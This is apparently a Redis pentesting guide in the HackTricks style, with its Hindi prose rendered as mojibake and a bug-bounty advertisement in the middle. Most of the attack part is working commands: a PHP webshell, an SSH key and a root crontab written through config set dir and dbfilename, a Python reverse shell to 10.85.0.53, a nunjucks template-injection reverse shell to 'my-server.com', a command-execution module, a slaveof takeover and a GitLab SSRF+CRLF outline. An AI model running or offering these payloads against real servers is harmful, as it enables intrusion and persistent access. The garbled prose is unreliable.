Redis рдореЗрдВ **рдбреЗрдЯрд╛рдмреЗрд╕ рд╕рдВрдЦреНрдпрд╛рдПрдВ 0 рд╕реЗ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИрдВ**ред рдЖрдк рдпрд╣ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИ рдпрд╛ рдирд╣реАрдВ `info` рдХрдорд╛рдВрдб рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ "Keyspace" рдЪрдВрдХ рдореЗрдВ:

![](<../.gitbook/assets/image (315).png>)

рдпрд╛ рдЖрдк рд╕рд┐рд░реНрдл рд╕рднреА **keyspaces** (рдбреЗрдЯрд╛рдмреЗрд╕) рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
INFO keyspace
```
рдЙрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ **рдбреЗрдЯрд╛рдмреЗрд╕ 0 рдФрд░ 1** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред **рдбреЗрдЯрд╛рдмреЗрд╕ 0 рдореЗрдВ 4 рдХреБрдВрдЬреА рд╣реИрдВ рдФрд░ рдбреЗрдЯрд╛рдмреЗрд╕ 1 рдореЗрдВ 1 рд╣реИ**ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ Redis рдбреЗрдЯрд╛рдмреЗрд╕ 0 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛рдмреЗрд╕ 1 рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдирд┐рдореНрди рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреА рд╣реЛрдЧреА:
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
рдпрджрд┐ рдЖрдк `GET <KEY>` рдЪрд▓рд╛рддреЗ рд╕рдордп рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддреНрд░реБрдЯрд┐ `-WRONGTYPE Operation against a key holding the wrong kind of value` рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХреБрдВрдЬреА рдХреБрдЫ рдФрд░ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬреЛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдпрд╛ рдкреВрд░реНрдгрд╛рдВрдХ рд╕реЗ рдЕрд▓рдЧ рд╣реИ рдФрд░ рдЗрд╕реЗ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реЗрд╖ рдСрдкрд░реЗрдЯрд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдХреБрдВрдЬреА рдХреЗ рдкреНрд░рдХрд╛рд░ рдХреЛ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП, `TYPE` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╕реВрдЪреА рдФрд░ рд╣реИрд╢ рдХреБрдВрдЬреА рдХреЗ рд▓рд┐рдПред
```
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]
```
**рдирдкрдо** [**redis-dump**](https://www.npmjs.com/package/redis-dump) **рдпрд╛ рдкрд╛рдпрдерди** [**redis-utils**](https://pypi.org/project/redis-utils/) **рдХреЗ рд╕рд╛рде рдбреЗрдЯрд╛рдмреЗрд╕ рдбрдВрдк рдХрд░реЗрдВред**

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof рдХреНрд░рд┐рдкреНрдЯреЛ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдХреЗ рд▓рд┐рдП рдШрд░ рд╣реИред**

**рджреЗрд░реА рдХреЗ рдмрд┐рдирд╛ рдкреБрд░рд╕реНрдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
HackenProof рдмрд╛рдЙрдВрдЯреА рдХреЗрд╡рд▓ рддрдм рд╢реБрд░реВ рд╣реЛрддреЗ рд╣реИрдВ рдЬрдм рдЙрдирдХреЗ рдЧреНрд░рд╛рд╣рдХ рдЗрдирд╛рдо рдмрдЬрдЯ рдЬрдорд╛ рдХрд░рддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рдЗрдирд╛рдо рдЙрд╕ рдмрдЧ рдХреЗ рд╕рддреНрдпрд╛рдкрд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдорд┐рд▓реЗрдЧрд╛ред

**рд╡реЗрдм3 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
рдмреНрд▓реЙрдХрдЪреЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдФрд░ рд╕реНрдорд╛рд░реНрдЯ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯреНрд╕ рдирдИ рдЗрдВрдЯрд░рдиреЗрдЯ рд╣реИрдВ! рдЗрд╕рдХреЗ рдЙрднрд░рддреЗ рджрд┐рдиреЛрдВ рдореЗрдВ рд╡реЗрдм3 рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рд╕реНрдЯрд░ рдХрд░реЗрдВред

**рд╡реЗрдм3 рд╣реИрдХрд░ рд▓реАрдЬреЗрдВрдб рдмрдиреЗрдВ**\
рдкреНрд░рддреНрдпреЗрдХ рд╕рддреНрдпрд╛рдкрд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╖реНрдард╛ рдЕрдВрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдкреНрддрд╛рд╣рд┐рдХ рд▓реАрдбрд░рдмреЛрд░реНрдб рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ рд╡рд┐рдЬрдпреА рдмрдиреЗрдВред

[**HackenProof рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**](https://hackenproof.com/register) рдФрд░ рдЕрдкрдиреЗ рд╣реИрдХреНрд╕ рд╕реЗ рдХрдорд╛рдИ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://hackenproof.com/register" %}

## Redis RCE

### рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реЗрд▓

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) рдЖрдкрдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд░реЗрдбрд┐рд╕(<=5.0.5) рдореЗрдВ рдПрдХ рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реЗрд▓ рдпрд╛ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP рд╡реЗрдмрд╢реЗрд▓

[**рдпрд╣рд╛рдВ**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html) рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реА рд╣реИред рдЖрдкрдХреЛ **рд╡реЗрдмрд╕рд╛рдЗрдЯ рдлрд╝реЛрд▓реНрдбрд░ рдХрд╛ рдкрде** рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
рдпрджрд┐ рд╡реЗрдмрд╢реЗрд▓ рдПрдХреНрд╕реЗрд╕ рдЕрд╕реНрд╡реАрдХреГрддрд┐ рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдк рдмреИрдХрдЕрдк рдХреЗ рдмрд╛рдж рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдЦрд╛рд▓реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкреБрдирдГ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВред

### рдЯреЗрдореНрдкрд▓реЗрдЯ рд╡реЗрдмрд╢реЗрд▓

рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ рдХреА рддрд░рд╣, рдЖрдк рдХрд┐рд╕реА рднреА html рдЯреЗрдореНрдкрд▓реЗрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдзрд┐рд╖реНрдард╛рдирд┐рдд рдХрд░рдиреЗ рдФрд░ рд╢реИрд▓ рдорд┐рд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рджреНрд╡рд╛рд░рд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ рдФрд░ рдПрдХ рд╢реИрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, [**рдЗрд╕ рд╡реНрд░рд╛рдЗрдЯрдЕрдк**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/) рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП, рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдиреЗ **nunjucks рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди** рджреНрд╡рд╛рд░рд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА **html рдореЗрдВ рдПрдХ рд░реЗрд╡ рд╢реИрд▓ рдбрд╛рд▓реА рд╣реИ:**
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдХрдИ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдХреИрд╢** рдореЗрдВ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдХреЛ **рдореЗрдореЛрд░реА рдореЗрдВ** рдХреИрд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдирдпрд╛ рдЯреЗрдореНрдкрд▓реЗрдЯ **рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдирд╣реАрдВ рд╣реЛрдЧрд╛**ред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдпрд╛ рддреЛ рдбреЗрд╡рд▓рдкрд░ рдиреЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдкреБрдирд░рд╛рд░рдВрдн рд╕рдХреНрд░рд┐рдп рдЫреЛрдбрд╝ рджреА рд╣реИ рдпрд╛ рдЖрдкрдХреЛ рд╕реЗрд╡рд╛ рдкрд░ рдбреАрдУрдПрд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА (рдФрд░ рдЙрдореНрдореАрдж рдХрд░реЗрдВрдЧреЗ рдХрд┐ рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдкреБрдирд░рд╛рд░рдВрдн рд╣реЛрдЧрд╛)ред
{% endhint %}

### SSH

рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`config get dir`** рдкрд░рд┐рдгрд╛рдо рдХреЛ рдЕрдиреНрдп рдореИрдиреНрдпреБрдЕрд▓ рдЕрднрд┐рд╢реЛрд╖рдг рдХрдорд╛рдВрдб рдХреЗ рдмрд╛рдж рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд░реЗрдбрд┐рд╕ рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЗрд╕реЗ рдкрд╣рд▓реЗ рдЪрд▓рд╛рдиреЗ рдХреА рд╕рд▓рд╛рд╣ рджреА рдЬрд╛рддреА рд╣реИред **`config get dir`** рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рдЖрдк **рд░реЗрдбрд┐рд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЗ **рд╣реЛрдо** (рдЖрдорддреМрд░ рдкрд░ _/var/lib/redis_ рдпрд╛ _/home/redis/.ssh_) рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЗрд╕реЗ рдЬрд╛рдирдХрд░ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк рдХрд╣рд╛рдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ `authenticated_users` рдлрд╝рд╛рдЗрд▓ рдХреЛ ssh рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд░реЗрдбрд┐рд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЗ рд╕рд╛рдеред рдпрджрд┐ рдЖрдк рдЕрдиреНрдп рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╣реЛрдо рдХреЛ рдЬрд╛рдирддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

1. рдЕрдкрдиреЗ рдкреАрд╕реА рдкрд░ рдПрдХ ssh рдкрдмреНрд▓рд┐рдХ-рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреБрдВрдЬреА рдЬреЛрдбрд╝реЗрдВ: **`ssh-keygen -t rsa`**
2. рдкрдмреНрд▓рд┐рдХ рдХреБрдВрдЬреА рдХреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦреЗрдВ: **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. рдлрд╝рд╛рдЗрд▓ рдХреЛ рд░реЗрдбрд┐рд╕ рдореЗрдВ рдЖрдпрд╛рдд рдХрд░реЗрдВ: **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. рд░реЗрдбрд┐рд╕ рд╕рд░реНрд╡рд░ рдкрд░ **authorized\_keys** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкрдмреНрд▓рд┐рдХ рдХреБрдВрдЬреА рд╕рд╣реЗрдЬреЗрдВ:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
5. рдЕрдВрдд рдореЗрдВ, рдЖрдк рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде **рд░реЗрдбрд┐рд╕ рд╕рд░реНрд╡рд░** рдкрд░ **ssh** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: **ssh -i id\_rsa redis@10.85.0.52**

**рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рдпрд╣рд╛рдВ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
рдЕрдВрддрд┐рдо рдЙрджрд╛рд╣рд░рдг Ubuntu рдХреЗ рд▓рд┐рдП рд╣реИ, **Centos** рдХреЗ рд▓рд┐рдП рдКрдкрд░ рджрд┐рдП рдЧрдП рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

рдЗрд╕ рддрд░реАрдХреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдмрд┐рдЯрдХреЙрдЗрди рдХрдорд╛рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: [yam](https://www.v2ex.com/t/286981#reply14)

### Redis рдореЙрдбреНрдпреВрд▓ рд▓реЛрдб рдХрд░реЗрдВ

1. [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) рдХреЗ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ рдЖрдк **рдХрд┐рд╕реА рднреА рдЖрд░рдмрд┐рдЯреНрд░реЗ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд░реЗрдбрд┐рд╕ рдореЙрдбреНрдпреВрд▓ рдХреЛ рдХрдВрдкрд╛рдЗрд▓** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
2. рдлрд┐рд░ рдЖрдкрдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдП рдЧрдП рдореЙрдбреНрдпреВрд▓ рдХреЛ **рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛** рдЪрд╛рд╣рд┐рдПред
3. `MODULE LOAD /path/to/mymodule.so` рдХреЗ рд╕рд╛рде **рд░рдирдЯрд╛рдЗрдо рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд┐рдП рдЧрдП рдореЙрдбреНрдпреВрд▓** рд▓реЛрдб рдХрд░реЗрдВред
4. рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд▓реЛрдб рдХрд┐рдП рдЧрдП рдореЙрдбреНрдпреВрд▓ рдХреА рд╕реВрдЪреА** рджреЗрдЦреЗрдВ: `MODULE LIST`
5. **рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░реЗрдВ:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
6. рдЪрд╛рд╣реЗрдВ рддреЛ рдореЙрдбреНрдпреВрд▓ рдХреЛ рдЕрдирд▓реЛрдб рдХрд░реЗрдВ: `MODULE UNLOAD mymodule`

### LUA рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдмрд╛рдИрдкрд╛рд╕

[**рдпрд╣рд╛рдВ**](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html) рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ Redis рд▓реБрдЖ рдХреЛрдб рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **EVAL** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рд▓рд┐рдВрдХ рдХрд┐рдП рдЧрдП рдкреЛрд╕реНрдЯ рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЗрд╕реЗ **dofile** рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рджреБрд░реБрдкрдпреЛрдЧ** рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди [рд╢рд╛рдпрдж](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) рдЕрдм рдпрд╣ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред рдлрд┐рд░ рднреА, рдпрджрд┐ рдЖрдк рд▓реБрдЖ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ **рдмрд╛рдИрдкрд╛рд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рд╕рд┐рд╕реНрдЯрдо рдкрд░ **рдЖрд░рдмрд┐рдЯреНрд░реЗ** рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЙрд╕реА рдкреЛрд╕реНрдЯ рд╕реЗ рдЖрдк рдХреБрдЫ **DoS рдХрд░рдиреЗ рдХреЗ рд╡рд┐рдХрд▓реНрдк** рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

рд▓реБрдЖ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ **CVEs**:

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### рдорд╛рд╕реНрдЯрд░-рд╕реНрд▓реЗрд╡ рдореЙрдбреНрдпреВрд▓

рдорд╛рд╕реНрдЯрд░ рд░реЗрдбрд┐рд╕ рд╕рднреА рдСрдкрд░реЗрд╢рди рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕реНрд▓реЗрд╡ рд░реЗрдбрд┐рд╕ рдореЗрдВ рд╕рд┐рдВрдХреНрд░рдирд╛рдЗрдЬрд╝ рд╣реЛрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рд╡рдВрд╢рд╡рд╛рджреА рд░реЗрдбрд┐рд╕ рдХреЛ рдПрдХ рд╕реНрд▓реЗрд╡ рд░реЗрдбрд┐рд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рди рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рд╣рдорд╛рд░реЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ, рдлрд┐рд░ рд╣рдо рдЕрдкрдиреЗ рд░реЗрдбрд┐рд╕ рдореЗрдВ рдХрдорд╛рдВрдб рджрд░реНрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## Redis рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП SSRF

рдпрджрд┐ рдЖрдк **рд╕реНрдкрд╖реНрдЯ рдкрд╛рда** рдЕрдиреБрд░реЛрдз **Redis рдХреЛ** рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде **рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдХреНрдпреЛрдВрдХрд┐ Redis рдЕрдиреБрд░реЛрдз рдХреЛ рдкрдВрдХреНрддрд┐-рдкрдВрдХреНрддрд┐ рдкрдврд╝реЗрдЧрд╛ рдФрд░ рдЙрд╕реЗ рд╕рдордЭрдиреЗ рдореЗрдВ рдЕрд╕рдордЭрд┐рдд рдкрдВрдХреНрддрд┐рдпреЛрдВ рдкрд░ рдХреЗрд╡рд▓ рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрдЧрд╛:
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдореЗрдВ **SSRF vuln** рдорд┐рд▓рддрд╛ рд╣реИ рдФрд░ рдЖрдк рдХреБрдЫ **рд╣реЗрдбрд░реНрд╕** (рд╕рдВрднрд╡рддрдГ CRLF vuln рдХреЗ рд╕рд╛рде) рдпрд╛ **POST parameters** рдХреЛ **рдирд┐рдпрдВрддреНрд░рд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк Redis рдХреЛ рд╡рд┐рдЪрд╛рд░рд╢рдХреНрддрд┐ рдХрдорд╛рдВрдб рднреЗрдЬ рд╕рдХреЗрдВрдЧреЗред

### рдЙрджрд╛рд╣рд░рдг: Gitlab SSRF + CRLF рд╕реЗ рд╢реЗрд▓

**Gitlab11.4.7** рдореЗрдВ рдПрдХ **SSRF** рджреБрд░реНрдмрд▓рддрд╛ рдФрд░ рдПрдХ **CRLF** рдорд┐рд▓рд╛ред **SSRF** рджреБрд░реНрдмрд▓рддрд╛ рдирдП рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛рдиреЗ рдХреЗ рд╕рдордп **URL рд╕реЗ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдЖрдпрд╛рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛** рдореЗрдВ рдереА рдФрд░ рдЗрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдПрдХрд╛рдВрддрд░рд┐рдХ IP рддрдХ рдкрд╣реБрдВрдЪ рджреА рдЬрд╛ рд╕рдХрддреА рдереА \[0:0:0:0:0:ffff:127.0.0.1] (рдпрд╣ 127.0.0.1 рддрдХ рдкрд╣реБрдВрдЪ рдХрд░реЗрдЧрд╛), рдФрд░ **CRLF** vuln рдХреЗрд╡рд▓ **URL** рдореЗрдВ **%0D%0A** рд╡рд░реНрдг рдЬреЛрдбрд╝рдХрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ред

